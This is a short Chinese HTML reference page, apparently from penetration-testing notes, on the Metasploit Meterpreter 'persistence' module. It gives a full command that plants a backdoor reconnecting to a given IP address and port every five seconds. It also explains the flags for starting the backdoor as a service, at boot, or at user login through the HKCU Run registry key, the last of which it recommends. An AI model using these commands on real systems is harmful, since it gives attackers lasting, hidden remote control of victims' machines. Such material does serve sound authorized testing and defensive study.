    <body><div class='page'><h1 class='title'>Persistence</h1><br/>持久化模块<br /><br /><br />Run persistence -h //查看帮助信息；<br />run persistence -U -i 5 -p 5555 -r 192.168.205.148<br /><br />-S：作为服务启动<br />-X：设置后门在机器启动后运行<br />-U：设置后门在用户登录后自启动。<br />该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；<br /> -i：设置反向连接间隔时间，单位为秒；<br />-p：设置反向连接的端口号；<br />-r：设置反向连接的ip地址。<br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
